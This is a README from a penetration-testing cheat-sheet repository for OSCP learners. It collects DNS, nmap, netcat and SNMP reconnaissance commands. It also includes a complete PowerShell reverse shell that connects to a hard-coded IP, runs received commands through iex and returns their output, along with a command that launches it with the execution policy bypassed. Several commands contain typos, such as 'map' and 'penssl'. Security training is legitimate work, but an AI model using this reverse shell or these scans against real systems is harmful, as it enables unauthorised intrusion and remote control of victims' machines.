<p align="center">
  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
</p>

# Pentest-Cheat-Sheets
This repo has a collection of snippets of codes and commands to help our lives!
The main purpose is not be a crutch, this is a way to do not waste our precious time!
This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.

## Ninja Tricks

- [Recon](#recon)
  - [DNS](#dns)
  - [Nmap](#nmap)
  - [NetCat](#netcat)
  - [SNMP](#SNMP)
  - [Mysql](#mysql)
  - [MS SQL](#ms-sql)
  - [Web Enumeration](#web-enumeration)
- [Exploitation](#exploitation)
  - [System Network](#system-network)
    - [RDP](#rdp)
    - [Pass The Hash](#pass-the-hash)
    - [Windows-Shell](#windows-shell)
  - [Web Application](#web-application)
      - [Web Remote Code Execution](#web-remote-code-execution)
      - [LFI](#lfi)
      - [encode](#encode)
      - [XSS](#xss)
      - [SQLi](#sqli)
        - [sqlmap](#sqlmap)
        - [Bare Hands](#bare-hands)
      - [Jekins](#jekins)
- [Pos-exploitation](#pos-exploitation)
  - [Reverse Shell](#reverse-shell)
    - [PHP Reverse Shell](#php-reverse-shell)
    - [Perl Reverse Shell](#perl-reverse-shell)
    - [python Reverse Shell](#python-reverse-shell)
    - [Ruby Reverse Shell](#ruby-reverse-shell)
    - [bash Reverse Shell](#bash-reverse-shell)
    - [powershell Reverse](#powershell-reverse)
  - [Linux](#linux)
    - [Linux Privilege Escalation](#linux-privilege-escalation)
    - [Data Haversting and Enumeration](#data-harvesting-enumeration)
    - [Linux Pivot](#linux-pivot)
      - [Sshutle](#sshutle)
      - [VPNPivot](#vpn-pivot)
      - [SSH Tunneling](#ssh-tunneling)
      - [Linux Backdoring](#linux-backdoring)
  - [Windows](#Windows)
    - [Windows Enumeration](#windows-enumeration)
    - [Windows Privilege Escalation](#windows-privilege-escalation)
    - [Hashdump](#hashdump)
    - [Transferring Files Without Metasploit](#ssh)
    - [Backdoring](#windows-backdoring)
    - [Windows Pivot](#windows-pivot)
      - [Plink](#plink)
- [Resources](#resources)
  - [Wordlist](#wordlist)
    - [seclist](#seclist)
    - [cotse](#cotse)
    - [PacketStorm](#packetstorm)
  - [Default Passwords](#default-passwords)
    - [Default Passoword](#default-password)
    - [Router Password](#Router-password)
  - [Leak](#leak)
    - [Pastebin](#pastebin)
  - [Tables](#tables)
- [Contribution](#contribution)

### Recon

##

#### DNS

##### Nslookup

Resolve a given hostname to the corresponding IP.

```shell
nslookup targetorganization.com
```

##### Reverse DNS lookup

```shell
nslookup -type=PTR IP_address
```

##### MX(Mail Exchange) lookup 

```shell
nslookup -type=MX domain
```

##### Zone Transfer

##### Using nslookup Command

```shell
nslookup
server domain.com
ls -d domain.com
```
##### Using HOST Command

host -t ns(Name Server) < domain >

```shell
host -t ns domain.com
```

after that test nameservers

host -l < domain >  < nameserver >

```shell
host -l domain.com ns2.domain.com
```

##### Nmap Dns Enumaration

```
nmap -F --dns-server <dns server ip> <target ip range>
```

#### Auto tools

##### DNSenum

```
dnsenum targetdomain.com
```

```
dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
```

##### DNSmap

```dnsmap targetdomain.com
```

```
dnsmap targetdomain.com -w <Wordlst file.txt>
```

Brute Force, the file is saved in /tmp

```
dnsmap targetdomain.com -r
```

##### DNSRecon DNS Brute Force

```
dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
```

##### Fierce.pl

```
fierce -dns targetdomain.com
```

##### HostMap

```
hostmap.rb -only-passive -t <IP>
```

We can use -with-zonetransfer or -bruteforce-level

##### Online Tools

* https://dnsdumpster.com/
* https://network-tools.com/nslook/
* https://www.dnsqueries.com/en/
* https://mxtoolbox.com/

##

#### Namp

Set the ip address as a varible
`export ip=192.168.1.100`
`export netw=192.168.1.0/24`

##### Detecting Live Hosts
Only Ip's

```shell
nmap -sn -n $netw | grep for | cut -d" " -f5
```

##### Stealth Scan

```shell
nmap -sS $ip
```

Only Open Ports and Banner Grab

```
nmap -n -Pn -sS $ip --open -sV
```

Stealth scan using FIN Scan 

```shell
map -sF $ip
```

##### Agressive scan

Without Ping scan, no dns resolution, show only open ports all and test All TCP Ports

```shell
nmap -n -Pn -sS -A $ip --open -p-
```

Nmap verbose scan, runs syn stealth, T4 timing, OS and service version info, traceroute and scripts against services

`nmap –v –sS –A –T4 $ip`

##### OS FigerPrint

`nmap -O $ip`

##### Quick Scan

`nmap -T4 -F $netw`

##### Quick Scan Plus

`nmap -sV -T4 -O -F --version-light $netw`

##### output to a file

`nmap -oN nameFile -p 1-65535 -sV -sS -A -T4 $ip`

##### output to a file Plus

`nmap -oA nameFile -p 1-65535 -sV -sS -A -T4 $netw`

##### Search NMAP scripts

`ls /usr/share/nmap/scripts/ | grep ftp`

* [Nmap Discovery](https://nmap.org/nsedoc/categories/discovery.html)


##

#### NetCat

##### Port Scanner

One port

```shell
nc -nvz 192.168.1.23 80
```

Port Range

```shell
nc -vnz 192.168.1.23 0-1000
```

##### Send files

* Server

```shell
nc -lvp 1234 > file_name_to_save
```

* Client

```shell
nc -vn 192.168.1.33 1234 < file_to_send
```

##### Executing remote script

* Server

```shell
nc -lvp 1234 -e ping.sh <IP>
```

* Client

```shell
nc -vn 192.168.1.33 1234
```

##### Chat with encryption

* Server

```shell
ncat -nlvp 8000 --ssl
```

* Client

```shell
ncat -nv 192.168.1.33 8000
```

##### Banner Grabbing

```shell
nc target port
HTTP_Verb path http/version
Host: url
```

```shell
nc www.bla.com.br 80
HEAD / HTTP/1.0
Host: www.bla.com.br
```

##### If this site uses https you need to use openssl

```shell
penssl s_client -quiet www.bla.com.br:443
```

##

#### SNMP

##### Fixing SNMP output

```shell
apt-get install snmp-mibs-downloader download-mibs
``` 

```shell
echo "" > /etc/snmp/snmp.conf
```

##### OneSixtyone

onesixtyone -c COMMUNITY_FILE -i Target_ip

```shell
onesixtyone -c community.txt -i Found_ips.txt
```

##### snmpwalk

Walking MIB's

snmpwalk  -c COMMUNITY -v VERSION target_ip

```shell
snmpwalk -c public -v1 192.168.25.77
```

specific MIB node
snmpwalk -c community -v version Target IP MIB Node
Example: USER ACCOUNTS = 1.3.6.1.4.1.77.1.2.25

```shell
snmpwalk -c public -v1 192.168.25.77 1.3.6.1.4.1.77.1.2.25
```

##### snmp-check

snmp-check -t target_IP | snmp-check -t TARGET -c COMMUNITY

```shell
snmp-check -t 172.20.10.5
```

```shell
snmp-check -t 172.20.10.5 -c public
```

##### Automate the username enumeration process for SNMPv3

```shell
apt-get install snmp snmp-mibs-downloader
```

```shell
wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
```

##### NMAP SNMPv3 Enumeration 

```shell
nmap -sV -p 161 --script=snmp-info 172.20.10.0/24
```

##### Default Credentials

```shell
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
```

##

### Reverse Shell

#### Powershell Reverse

Create a simple powershell script called reverse.ps1:

```powershell
function reverse_powershell {
    $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
}
```

```powershell
powershell -ExecutionPolicy bypass -command "Import-Module reverse.ps1; reverse_powershell"
```
##

### Resources
* Wordlists
  * [PacketStorm](https://packetstormsecurity.com/Crackers/wordlists/dictionaries/)
  * [SecList](https://github.com/danielmiessler/SecLists)
  * [cotse](http://www.cotse.com/tools/wordlists1.htm)
* Default Password
  * [DefaultPassword](http://www.defaultpassword.com/)
  * [RouterPassword](http://www.routerpasswords.com/)
* Leak
  * [Pastebin](https://pastebin.com)
* Tables
  * [RainbowCrack](https://project-rainbowcrack.com/table.htm)

##

## Contribution

[HOW TO](https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/tree/master/contribution.md)
